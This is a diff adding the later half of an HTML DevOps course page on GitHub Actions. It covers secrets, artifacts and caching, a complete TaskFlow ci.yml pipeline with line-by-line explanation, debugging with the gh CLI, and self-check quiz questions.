+              <tr><td>Stored</td><td>Encrypted in GitHub</td><td>GitHub settings</td><td>In the workflow file (Git)</td></tr>
+              <tr><td>Readable later</td><td>No (write-only)</td><td>Yes</td><td>Yes</td></tr>
+              <tr><td>In logs</td><td>Masked <code class="inl">***</code></td><td>Plain</td><td>Plain</td></tr>
+              <tr><td>Syntax</td><td><code class="inl">${{ secrets.X }}</code></td><td><code class="inl">${{ vars.X }}</code></td><td><code class="inl">${{ env.X }}</code> / <code class="inl">$X</code></td></tr>
+              <tr><td>Example</td><td>DOCKERHUB_TOKEN</td><td>DOCKERHUB_USERNAME</td><td>NODE_VERSION</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="callout warn">
+          <span class="c-title">Common mistakes</span>
+          <ul>
+            <li><code class="inl">Error: Username and password required</code> from <code class="inl">docker/login-action</code> → secret name typo, secret not set, an environment secret used without <code class="inl">environment:</code>, or a PR from a <strong>fork</strong> (forks never receive secrets).</li>
+            <li><code class="inl">Resource not accessible by integration</code> → <code class="inl">GITHUB_TOKEN</code> lacks a permission; add it under <code class="inl">permissions:</code>.</li>
+            <li>Masking only hides the exact string: <code class="inl">echo $TOKEN | base64</code> or printing part of it leaks it. Never echo secrets; mask derived values with <code class="inl">echo "::add-mask::$VALUE"</code>.</li>
+            <li><code class="inl">if: secrets.X != ''</code> isn't allowed — map the secret to a job <code class="inl">env:</code> and test <code class="inl">env.X</code>.</li>
+            <li>A secret committed to Git is compromised even if you delete the file: rotate it first (Session 19).</li>
+          </ul>
+        </div>
+
+        <div class="recap">
+          <span class="c-title">Recap</span>
+          Tokens → secrets (masked, write-only); config → variables. <code class="inl">GITHUB_TOKEN</code> is automatic, set least <code class="inl">permissions:</code>. Environments add approvals + scoped secrets. Forks get no secrets.
+        </div>
+      </section>
+
+      <!-- ===================== 6. ARTIFACTS ===================== -->
+      <section id="artifacts">
+        <h2><span class="sec-num">6</span> Artifacts &amp; caching</h2>
+        <hr class="section-rule" />
+
+        <div class="callout eli5">
+          <span class="c-title">Explain like I'm 5</span>
+          <p>Artifacts are the finished homework you hand in and keep (reports, builds). Cache is your scratch notes you reuse next time to work faster (downloaded packages).</p>
+        </div>
+
+        <ul>
+          <li>An <span class="term">artifact</span> is a file/folder uploaded from a job: test and coverage reports, build output, a saved Docker image. Download it from the run page, from another job, or with <code class="inl">gh run download</code>.</li>
+          <li>With v4: artifact names must be <strong>unique within a run</strong> and are immutable → matrix jobs need the matrix value in the name.</li>
+        </ul>
+<pre>      - name: Upload coverage report
+        if: always()                                 <span class="cm"># keep the report even when tests fail</span>
+        uses: actions/upload-artifact@v4
+        with:
+          name: coverage-node${{ matrix.node }}      <span class="cm"># unique per matrix job</span>
+          path: coverage/                            <span class="cm"># file, folder, or glob; several lines allowed</span>
+          retention-days: <span class="nm">7</span>                          <span class="cm"># default 90</span>
+          if-no-files-found: error                   <span class="cm"># default warn</span>
+
+  <span class="cm"># in a later job (needs: test):</span>
+      - uses: actions/download-artifact@v4
+        with:
+          pattern: coverage-*                        <span class="cm"># all matching artifacts...</span>
+          merge-multiple: <span class="nm">true</span>                       <span class="cm"># ...into one folder</span>
+          path: all-coverage/</pre>
+<pre><span class="pr">$</span> gh run download 18233456789 -n coverage-node20 -D ./coverage-node20
+<span class="pr">$</span> ls coverage-node20
+<span class="out">clover.xml  coverage-final.json  lcov-report  lcov.info</span></pre>
+
+        <h3>Cache: faster installs</h3>
+        <p><code class="inl">setup-node</code> with <code class="inl">cache: npm</code> caches <code class="inl">~/.npm</code> keyed on the hash of <code class="inl">package-lock.json</code> — usually all you need. The general form:</p>
+<pre>      - uses: actions/cache@v4
+        with:
+          path: ~/.npm
+          key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}   <span class="cm"># exact hit when lockfile unchanged</span>
+          restore-keys: |
+            ${{ runner.os }}-npm-                                             <span class="cm"># fallback: newest partial match</span></pre>
+<pre><span class="cm"># log of setup-node on the 2nd run</span>
+<span class="out">Cache restored successfully
+Cache restored from key: node-cache-Linux-x64-npm-3c1f0e9a7b2d...
+...
+added 312 packages in 4s</span>          <span class="cm"># vs ~19s with a cold cache</span></pre>
+
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th></th><th>Artifact</th><th>Cache</th></tr></thead>
+            <tbody>
+              <tr><td>Purpose</td><td>Keep/share <em>outputs</em> of a run</td><td>Speed up <em>inputs</em> (dependencies) across runs</td></tr>
+              <tr><td>Scope</td><td>One run (other jobs + people downloading)</td><td>Many runs, by key (branch-scoped)</td></tr>
+              <tr><td>Lifetime</td><td><code class="inl">retention-days</code> (default 90)</td><td>Evicted after 7 days unused; 10 GB per repo</td></tr>
+              <tr><td>If missing</td><td>Job that needs it fails</td><td>Just slower (cache miss)</td></tr>
+              <tr><td>Examples</td><td>coverage/, junit.xml, dist/, image.tar.gz</td><td>~/.npm, ~/.cache/pip, Docker layers</td></tr>
+              <tr><td>Action</td><td><code class="inl">upload-artifact</code> / <code class="inl">download-artifact</code></td><td><code class="inl">actions/cache</code> or <code class="inl">setup-*</code> <code class="inl">cache:</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="callout warn">
+          <span class="c-title">Common mistakes</span>
+          <ul>
+            <li>Matrix jobs uploading the same artifact name → <code class="inl">Conflict: an artifact with this name already exists on the workflow run</code>. Add <code class="inl">${{ matrix.node }}</code> to the name.</li>
+            <li><code class="inl">setup-node</code> with <code class="inl">cache: npm</code> but no committed lockfile → <code class="inl">Dependencies lock file is not found in /home/runner/work/taskflow/taskflow. Supported file patterns: package-lock.json,npm-shrinkwrap.json,yarn.lock</code>. Commit <code class="inl">package-lock.json</code>.</li>
+            <li>Caching <code class="inl">node_modules</code> instead of <code class="inl">~/.npm</code> — <code class="inl">npm ci</code> deletes <code class="inl">node_modules</code> anyway.</li>
+          </ul>
+        </div>
+
+        <div class="recap">
+          <span class="c-title">Recap</span>
+          Artifacts = outputs you keep or hand to the next job (unique names, retention). Cache = reusable dependencies keyed by lockfile hash. Different VMs per job → artifacts are how files travel.
+        </div>
+      </section>
+
+      <!-- ===================== 7. BUILD & TEST PIPELINE ===================== -->
+      <section id="build-test">
+        <h2><span class="sec-num">7</span> Build &amp; test pipeline: TaskFlow's ci.yml</h2>
+        <hr class="section-rule" />
+
+        <div class="callout eli5">
+          <span class="c-title">Explain like I'm 5</span>
+          <p>Everything from this page in one recipe: check style, run tests on three Node versions, bake the image, taste it, and only then put it on the shelf.</p>
+        </div>
+
+        <p>The scripts CI calls (<code class="inl">package.json</code> excerpt; tests use Jest + supertest in <code class="inl">test/</code>):</p>
+<pre>  <span class="st">"scripts"</span>: {
+    <span class="st">"start"</span>: <span class="st">"node server.js"</span>,
+    <span class="st">"lint"</span>: <span class="st">"eslint ."</span>,
+    <span class="st">"test"</span>: <span class="st">"jest"</span>
+  }</pre>
+
+<pre> trigger: push to main / PR to main / manual / weekly
+        │
+        ├──► lint ───────────────────┐
+        │                            ├──► build ─────────────────────► publish
+        └──► test (node 20, 22, 24) ─┘    docker build                  only on push to main
+               ↳ artifacts:                smoke test GET /health        docker load → login → push
+                 coverage-node20/22/24     ↳ artifact: image.tar.gz      uses secrets.DOCKERHUB_TOKEN</pre>
+
+        <div class="fname">.github/workflows/ci.yml</div>
+<pre><span class="kw">name</span>: CI
+
+<span class="kw">on</span>:
+  push:
+    branches: [main]
+    paths-ignore:
+      - <span class="st">'**.md'</span>
+      - <span class="st">'docs/**'</span>
+  pull_request:
+    branches: [main]
+  workflow_dispatch:
+  schedule:
+    - cron: <span class="st">'30 2 * * 1'</span>                       <span class="cm"># Mondays 08:00 IST: catch breakage from new deps</span>
+
+<span class="kw">permissions</span>:
+  contents: read
+
+<span class="kw">concurrency</span>:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
+
+<span class="kw">env</span>:
+  NODE_VERSION: <span class="st">'20'</span>
+  IMAGE: shauryav/taskflow-api
+
+<span class="kw">jobs</span>:
+  lint:
+    runs-on: ubuntu-latest
+    timeout-minutes: <span class="nm">5</span>
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: ${{ env.NODE_VERSION }}
+          cache: npm
+      - run: npm ci
+      - run: npm run lint
+
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: <span class="nm">10</span>
+    strategy:
+      fail-fast: <span class="nm">false</span>
+      matrix:
+        node: [<span class="nm">20</span>, <span class="nm">22</span>, <span class="nm">24</span>]
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: ${{ matrix.node }}
+          cache: npm
+      - run: npm ci
+      - run: npm test -- --coverage
+      - name: Upload coverage report
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: coverage-node${{ matrix.node }}
+          path: coverage/
+          retention-days: <span class="nm">7</span>
+
+  build:
+    needs: [lint, test]
+    runs-on: ubuntu-latest
+    timeout-minutes: <span class="nm">15</span>
+    outputs:
+      tag: ${{ steps.meta.outputs.tag }}
+    steps:
+      - uses: actions/checkout@v4
+      - name: Compute image tag
+        id: meta
+        run: echo "tag=sha-${GITHUB_SHA::7}" &gt;&gt; "$GITHUB_OUTPUT"
+      - name: Build image
+        run: docker build -t "$IMAGE:${{ steps.meta.outputs.tag }}" .
+      - name: Smoke test
+        run: |
+          docker run -d --name api -p 3000:3000 "$IMAGE:${{ steps.meta.outputs.tag }}"
+          curl --fail --silent --show-error --retry 10 --retry-all-errors --retry-delay 2 \
+            http://localhost:3000/health
+      - name: Container logs (on failure)
+        if: failure()
+        run: docker logs api
+      - name: Save image
+        run: docker save "$IMAGE:${{ steps.meta.outputs.tag }}" | gzip &gt; image.tar.gz
+      - uses: actions/upload-artifact@v4
+        with:
+          name: image
+          path: image.tar.gz
+          retention-days: <span class="nm">1</span>
+
+  publish:
+    needs: build
+    if: github.event_name == 'push' &amp;&amp; github.ref == 'refs/heads/main'
+    runs-on: ubuntu-latest
+    timeout-minutes: <span class="nm">10</span>
+    steps:
+      - uses: actions/download-artifact@v4
+        with:
+          name: image
+      - run: docker load -i image.tar.gz
+      - uses: docker/login-action@v3
+        with:
+          username: ${{ vars.DOCKERHUB_USERNAME }}
+          password: ${{ secrets.DOCKERHUB_TOKEN }}
+      - name: Push image
+        run: docker push "$IMAGE:${{ needs.build.outputs.tag }}"</pre>
+
+        <h3>Line by line</h3>
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th>Lines</th><th>What and why</th></tr></thead>
+            <tbody>
+              <tr><td><code class="inl">name: CI</code></td><td>Workflow name in the Actions tab and in status checks ("CI / test (20)").</td></tr>
+              <tr><td><code class="inl">on.push.branches: [main]</code> + <code class="inl">paths-ignore</code></td><td>Run on pushes to main, but not when only Markdown/docs changed.</td></tr>
+              <tr><td><code class="inl">on.pull_request.branches: [main]</code></td><td>Check every PR targeting main before merge (feature-branch pushes are covered by their PR).</td></tr>
+              <tr><td><code class="inl">workflow_dispatch</code> / <code class="inl">schedule</code></td><td>Manual "Run workflow" button; weekly run in UTC (02:30 UTC = 08:00 IST).</td></tr>
+              <tr><td><code class="inl">permissions: contents: read</code></td><td><code class="inl">GITHUB_TOKEN</code> may only read code — least privilege.</td></tr>
+              <tr><td><code class="inl">concurrency</code></td><td>One run per workflow + branch/PR. A new push to a PR cancels its stale run; on main the new run waits for the running one instead of killing it.</td></tr>
+              <tr><td><code class="inl">env:</code> (top)</td><td>Workflow-wide env vars: usable as <code class="inl">${{ env.NODE_VERSION }}</code> in YAML and <code class="inl">$IMAGE</code> in shell.</td></tr>
+              <tr><td><code class="inl">lint.runs-on</code>, <code class="inl">timeout-minutes: 5</code></td><td>Fresh Ubuntu VM; kill the job after 5 min instead of the 6 h default.</td></tr>
+              <tr><td><code class="inl">uses: actions/checkout@v4</code></td><td>Clone the commit being tested into <code class="inl">$GITHUB_WORKSPACE</code>.</td></tr>
+              <tr><td><code class="inl">uses: actions/setup-node@v4</code> + <code class="inl">with:</code></td><td>Install Node 20 and restore/save the npm cache (keyed on <code class="inl">package-lock.json</code>).</td></tr>
+              <tr><td><code class="inl">run: npm ci</code></td><td>Clean, exact install from the lockfile (fails if out of sync — what you want in CI; <code class="inl">npm install</code> would silently change the lockfile).</td></tr>
+              <tr><td><code class="inl">run: npm run lint</code></td><td>ESLint. Fails the job on errors.</td></tr>
+              <tr><td><code class="inl">test.strategy.matrix.node</code></td><td>Three parallel jobs: test (20), test (22), test (24). <code class="inl">fail-fast: false</code> shows every version's result.</td></tr>
+              <tr><td><code class="inl">npm test -- --coverage</code></td><td><code class="inl">--</code> passes <code class="inl">--coverage</code> through npm to Jest → writes <code class="inl">coverage/</code>.</td></tr>
+              <tr><td><code class="inl">upload-artifact</code> + <code class="inl">if: always()</code></td><td>Keep each version's coverage for 7 days, even when tests fail.</td></tr>
+              <tr><td><code class="inl">build.needs: [lint, test]</code></td><td>Starts only after lint and all 3 test jobs pass.</td></tr>
+              <tr><td><code class="inl">outputs.tag</code> + step <code class="inl">id: meta</code></td><td><code class="inl">${GITHUB_SHA::7}</code> (bash substring) → <code class="inl">sha-4f2a9c1</code>, written to <code class="inl">$GITHUB_OUTPUT</code>, exposed to later jobs.</td></tr>
+              <tr><td><code class="inl">docker build -t …</code></td><td>Docker is pre-installed on Ubuntu runners. Uses the Dockerfile from Session 7.</td></tr>
+              <tr><td>Smoke test</td><td>Start the container and retry <code class="inl">/health</code> for ~20 s while Node boots. <code class="inl">--retry-all-errors</code> also retries "connection reset/refused" during startup; <code class="inl">--fail</code> makes curl exit non-zero on HTTP ≥ 400. (<code class="inl">/health</code> doesn't touch the DB, so no Postgres is needed.)</td></tr>
+              <tr><td><code class="inl">if: failure()</code> logs step</td><td>Only when something above failed: print container logs to see <em>why</em>.</td></tr>
+              <tr><td><code class="inl">docker save | gzip</code> + upload</td><td>The next job is a new VM; ship the exact tested image as an artifact (1-day retention).</td></tr>
+              <tr><td><code class="inl">publish.if</code></td><td>Only for pushes to main — PRs, manual and scheduled runs stop after build.</td></tr>
+              <tr><td><code class="inl">download-artifact</code> + <code class="inl">docker load</code></td><td>Restore the image built and smoke-tested in <code class="inl">build</code> (no rebuild → same bits).</td></tr>
+              <tr><td><code class="inl">docker/login-action@v3</code></td><td>Log in to Docker Hub (the default registry) with the variable + secret.</td></tr>
+              <tr><td><code class="inl">docker push … needs.build.outputs.tag</code></td><td>Push <code class="inl">shauryav/taskflow-api:sha-4f2a9c1</code>. Session 19 replaces this job with Buildx, GHCR, scans and deploy.</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Running it and reading the result</h3>
+<pre><span class="pr">$</span> git switch -c feat/due-date &amp;&amp; git commit -am "feat: due dates" &amp;&amp; git push -u origin feat/due-date
+<span class="pr">$</span> gh pr create --fill --base main
+<span class="pr">$</span> gh run list --limit 3
+<span class="out">STATUS  TITLE                       WORKFLOW  BRANCH         EVENT         ID           ELAPSED  AGE
+X       feat: due dates             CI        feat/due-date  pull_request  18233114562  1m3s     about 1 minute ago
+✓       Merge pull request #11 ...  CI        main           push          18232901177  3m41s    about 2 hours ago
+✓       ci: hello workflow          Hello     main           push          18231904410  9s       about 3 hours ago</span>
+
+<span class="pr">$</span> gh run view 18233114562
+<span class="out">X feat/due-date CI · 18233114562
+Triggered via pull_request about 1 minute ago
+
+JOBS
+✓ lint in 22s (ID 52009988771)
+X test (20) in 38s (ID 52009988772)
+  ✓ Set up job
+  ✓ Run actions/checkout@v4
+  ✓ Run actions/setup-node@v4
+  ✓ Run npm ci
+  X Run npm test -- --coverage
+  ✓ Upload coverage report
+  ✓ Complete job
+X test (22) in 36s (ID 52009988773)
+X test (24) in 37s (ID 52009988774)
+- build (ID 52009988790)
+
+ANNOTATIONS
+X Process completed with exit code 1.
+test (20): .github#21
+
+To see what failed, try: gh run view 18233114562 --log-failed
+View this run on GitHub: https://github.com/shauryav/taskflow/actions/runs/18233114562</span>
+
+<span class="pr">$</span> gh run view 18233114562 --log-failed | cut -f3 | grep -v '^\s*$' | head -8
+<span class="out">2026-10-09T05:12:44.1234567Z FAIL test/tasks.test.js
+2026-10-09T05:12:44.1245678Z   ● POST /tasks › rejects a task without a title
+2026-10-09T05:12:44.1256789Z     expected 400 "Bad Request", got 201 "Created"
+2026-10-09T05:12:44.1301122Z       at Object.&lt;anonymous&gt; (test/tasks.test.js:42:8)
+2026-10-09T05:12:44.2012345Z Tests:       1 failed, 11 passed, 12 total
+2026-10-09T05:12:44.3523456Z ##[error]Process completed with exit code 1.</span></pre>
+        <ul>
+          <li>How to read it: which <strong>job</strong> failed (all 3 test jobs → a code bug, not a Node-version issue) → which <strong>step</strong> (<code class="inl">npm test</code>) → the <strong>first error line</strong> in that step (validation missing for empty title). <code class="inl">build</code> shows <code class="inl">-</code> = skipped because its <code class="inl">needs</code> failed.</li>
+          <li>Fix, push again to the same branch — the PR's checks re-run automatically (and the stale run is cancelled by <code class="inl">concurrency</code>).</li>
+          <li>Flaky failure? <code class="inl">gh run rerun 18233114562 --failed</code> re-runs only failed jobs. Enable step debug logs by setting the secret/variable <code class="inl">ACTIONS_STEP_DEBUG=true</code> or ticking <em>Enable debug logging</em> on re-run.</li>
+          <li>Make it a gate: Settings → Branches → protect <code class="inl">main</code> → require status checks <code class="inl">lint</code>, <code class="inl">test (20)</code>, <code class="inl">test (22)</code>, <code class="inl">test (24)</code>, <code class="inl">build</code> → a red PR can't be merged.</li>
+        </ul>
+
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th>Log says</th><th>Cause</th><th>Fix</th></tr></thead>
+            <tbody>
+              <tr><td><code class="inl">npm ci can only install packages when your package.json and package-lock.json ... are in sync</code></td><td>Edited package.json without updating the lockfile</td><td><code class="inl">npm install</code> locally, commit <code class="inl">package-lock.json</code></td></tr>
+              <tr><td><code class="inl">Missing script: "lint"</code></td><td>No <code class="inl">lint</code> in package.json scripts</td><td>Add <code class="inl">"lint": "eslint ."</code></td></tr>
+              <tr><td><code class="inl">curl: (7) Failed to connect to localhost port 3000</code> after retries</td><td>Container exited (crash on start, wrong <code class="inl">CMD</code>, app listening on 127.0.0.1)</td><td>Read the "Container logs" step; listen on <code class="inl">0.0.0.0</code></td></tr>
+              <tr><td><code class="inl">denied: requested access to the resource is denied</code> on push</td><td>Token is read-only, or image name isn't under your Docker Hub user</td><td>Read &amp; Write token; tag <code class="inl">shauryav/...</code></td></tr>
+              <tr><td><code class="inl">The job running on runner GitHub Actions 7 has exceeded the maximum execution time of 10 minutes.</code></td><td><code class="inl">timeout-minutes</code> hit (hung test, waiting for input)</td><td>Fix the hang; raise the timeout only if justified</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Run workflows locally with <code class="inl">act</code> (brief)</h3>
+        <p><a href="https://github.com/nektos/act" target="_blank" rel="noopener">act</a> runs jobs in Docker containers on your machine — quick feedback without pushing. Not identical to GitHub's VMs (fewer tools, no real <code class="inl">GITHUB_TOKEN</code>), so treat it as a pre-check.</p>
+<pre><span class="pr">$</span> brew install act
+<span class="pr">$</span> act -l
+<span class="out">Stage  Job ID   Job name  Workflow name  Workflow file  Events
+0      lint     lint      CI             ci.yml         push,pull_request,workflow_dispatch,schedule
+0      test     test      CI             ci.yml         push,pull_request,workflow_dispatch,schedule
+1      build    build     CI             ci.yml         push,pull_request,workflow_dispatch,schedule
+2      publish  publish   CI             ci.yml         push,pull_request,workflow_dispatch,schedule</span>
+<span class="pr">$</span> act pull_request -j test --matrix node:20           <span class="cm"># one matrix entry</span>
+<span class="pr">$</span> act push -j publish --secret-file .secrets           <span class="cm"># KEY=value lines; keep .secrets in .gitignore</span></pre>
+
+        <div class="recap">
+          <span class="c-title">Recap</span>
+          ci.yml = lint ∥ test-matrix → build + smoke test → publish (main only). Debug: <code class="inl">gh run list</code> → <code class="inl">gh run view --log-failed</code> → first error → fix → push. Protect main with required checks.
+        </div>
+      </section>
+
+      <!-- ===================== COMMANDS ===================== -->
+      <section id="commands">
+        <h2><span class="sec-num">⌘</span> Commands you must know</h2>
+        <hr class="section-rule" />
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th>Command</th><th>What it does</th></tr></thead>
+            <tbody>
+              <tr><td><code class="inl">gh workflow list</code></td><td>Workflows in the repo and their state.</td></tr>
+              <tr><td><code class="inl">gh workflow run ci.yml --ref main -f reason=test</code></td><td>Trigger a <code class="inl">workflow_dispatch</code> run with inputs.</td></tr>
+              <tr><td><code class="inl">gh run list --workflow ci.yml --limit 5</code></td><td>Recent runs with status, branch, event, ID.</td></tr>
+              <tr><td><code class="inl">gh run watch</code></td><td>Live-follow the current run in the terminal.</td></tr>
+              <tr><td><code class="inl">gh run view ID</code> / <code class="inl">--log-failed</code> / <code class="inl">--log</code></td><td>Jobs + steps summary / only failed steps' logs / full log.</td></tr>
+              <tr><td><code class="inl">gh run rerun ID --failed</code></td><td>Re-run only the failed jobs.</td></tr>
+              <tr><td><code class="inl">gh run download ID -n coverage-node20</code></td><td>Download an artifact.</td></tr>
+              <tr><td><code class="inl">gh secret set NAME</code> / <code class="inl">gh secret set NAME --env production</code></td><td>Create/update a repo / environment secret.</td></tr>
+              <tr><td><code class="inl">gh variable set NAME --body value</code></td><td>Create a configuration variable.</td></tr>
+              <tr><td><code class="inl">gh secret list</code> / <code class="inl">gh variable list</code></td><td>Names (never values) of secrets / variables.</td></tr>
+              <tr><td><code class="inl">echo "k=v" &gt;&gt; "$GITHUB_OUTPUT"</code></td><td>Set a step output (inside a <code class="inl">run</code> step).</td></tr>
+              <tr><td><code class="inl">echo "K=v" &gt;&gt; "$GITHUB_ENV"</code></td><td>Set an env var for later steps of the job.</td></tr>
+              <tr><td><code class="inl">npm ci</code></td><td>Exact, clean dependency install for CI.</td></tr>
+              <tr><td><code class="inl">act -l</code> / <code class="inl">act -j test</code></td><td>List / run jobs locally in Docker.</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- ===================== WRAP-UP ===================== -->
+      <section id="wrapup">
+        <h2><span class="sec-num">★</span> Putting it all together</h2>
+        <hr class="section-rule" />
+        <div class="bigidea">
+          <span class="c-title">The big idea</span>
+          <p>CI means every TaskFlow change is checked automatically; CD means a tested artifact is always ready (delivery) or shipped (deployment). In GitHub Actions an event starts a workflow; its jobs run in parallel on fresh runners unless chained with <code class="inl">needs</code>, and each job's steps either <code class="inl">uses</code> an action or <code class="inl">run</code> a command. <code class="inl">ci.yml</code> lints, tests on Node 20/22/24, builds and smoke-tests the image, passes it on as an artifact, and pushes it with a Docker Hub secret only for main. Session 19 adds security scans, GHCR and a Helm deploy to this pipeline.</p>
+        </div>
+
+        <h3>Quick self-check</h3>
+        <details class="quiz">
+          <summary>Continuous Delivery vs Continuous Deployment — what is the one difference?</summary>
+          <p class="ans">Delivery keeps every passing build ready and deploys to production after a manual approval; Deployment releases to production automatically with no human gate.</p>
+        </details>
+        <details class="quiz">
+          <summary>Jobs <code class="inl">lint</code> and <code class="inl">test</code> have no <code class="inl">needs</code>; <code class="inl">build</code> has <code class="inl">needs: [lint, test]</code>. In what order do they run, and what if <code class="inl">test</code> fails?</summary>
+          <p class="ans"><code class="inl">lint</code> and <code class="inl">test</code> run in parallel; <code class="inl">build</code> starts only after both succeed. If <code class="inl">test</code> fails, <code class="inl">build</code> is skipped (unless it uses <code class="inl">if: always()</code>/<code class="inl">failure()</code>).</p>
+        </details>
+        <details class="quiz">
+          <summary>A file created in job <code class="inl">build</code> isn't found in job <code class="inl">publish</code>. Why, and how do you fix it?</summary>
+          <p class="ans">Each job runs on a separate fresh runner, so filesystems aren't shared. Upload it with <code class="inl">actions/upload-artifact</code> in <code class="inl">build</code> and download it with <code class="inl">actions/download-artifact</code> in <code class="inl">publish</code> (which <code class="inl">needs: build</code>).</p>
+        </details>
+        <details class="quiz">
+          <summary>What is the difference between <code class="inl">uses:</code> and <code class="inl">run:</code> in a step?</summary>
+          <p class="ans"><code class="inl">uses:</code> runs a reusable action (e.g. <code class="inl">actions/checkout@v4</code>) configured via <code class="inl">with:</code>; <code class="inl">run:</code> executes shell commands on the runner.</p>
+        </details>
+        <details class="quiz">
+          <summary>A PR from a fork fails at <code class="inl">docker/login-action</code> with "Username and password required", but PRs from your own branches pass. Why?</summary>
+          <p class="ans">Workflows triggered by <code class="inl">pull_request</code> from forks don't receive repository secrets (and get a read-only <code class="inl">GITHUB_TOKEN</code>), so <code class="inl">secrets.DOCKERHUB_TOKEN</code> is empty. Don't log in/push on PRs — gate it with <code class="inl">if: github.event_name == 'push'</code>.</p>
+        </details>
+        <details class="quiz">
+          <summary>Artifact vs cache: which would you use for coverage reports, and which for <code class="inl">~/.npm</code>?</summary>
+          <p class="ans">Coverage reports → artifact (an output to keep/download). <code class="inl">~/.npm</code> → cache (reusable input that speeds up later runs; a miss just makes it slower).</p>
+        </details>
+        <details class="quiz">
+          <summary>What does <code class="inl">strategy.matrix.node: [20, 22, 24]</code> with <code class="inl">fail-fast: false</code> produce?</summary>
+          <p class="ans">Three parallel jobs from one definition — test (20), test (22), test (24) — each with <code class="inl">${{ matrix.node }}</code> set. With <code class="inl">fail-fast: false</code>, one failing doesn't cancel the others.</p>
+        </details>
+      </section>
+
+      <!-- ===================== REFERENCES ===================== -->
+      <section id="refs">
+        <h2><span class="sec-num">📚</span> References</h2>
+        <hr class="section-rule" />
+        <h4>Class material</h4>
+        <ul>
+          <li>📄 <a href="https://docs.google.com/spreadsheets/d/1aQ_sRTKwFHcVXNYr_hwVBqdjS7vZF25igFQXQZ-cz5s/edit?gid=1083311221" target="_blank" rel="noopener">Term 9 DevOps &amp; Cloud syllabus (source sheet)</a> — Session 18: CI/CD &amp; GitHub Actions.</li>
+        </ul>
+        <h4>Official docs</h4>
+        <ul>
+          <li><a href="https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions" target="_blank" rel="noopener">Workflow syntax for GitHub Actions</a> — every key: on, jobs, steps, strategy, concurrency.</li>
+          <li><a href="https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows" target="_blank" rel="noopener">Events that trigger workflows</a> — push, pull_request, schedule, workflow_dispatch.</li>
+          <li><a href="https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions" target="_blank" rel="noopener">Using secrets in GitHub Actions</a> — levels, masking, forks.</li>
+          <li><a href="https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs" target="_blank" rel="noopener">Contexts reference</a> — github, env, vars, secrets, matrix, needs, steps.</li>
+          <li><a href="https://cli.github.com/manual/gh_run" target="_blank" rel="noopener">gh run manual</a> — list, view, watch, rerun, download.</li>
+        </ul>
+      </section>
+
+      <nav class="pager">
+        <a href="session-17.html"><div class="dir">← Previous</div><div class="ttl">Session 17: Helm</div></a>
+        <a class="next" href="session-19.html"><div class="dir">Next →</div><div class="ttl">Session 19: Complete CI/CD &amp; DevSecOps</div></a>
+      </nav>
+
+      </article>
+    </div>
+  </main>
+
+  <footer class="foot wrap">DevOps &amp; Cloud · Session 18 — CI/CD &amp; GitHub Actions</footer>
+
+  <script src="../../../assets/js/app.js?v=20261009a"></script>
+</body>
+</html>
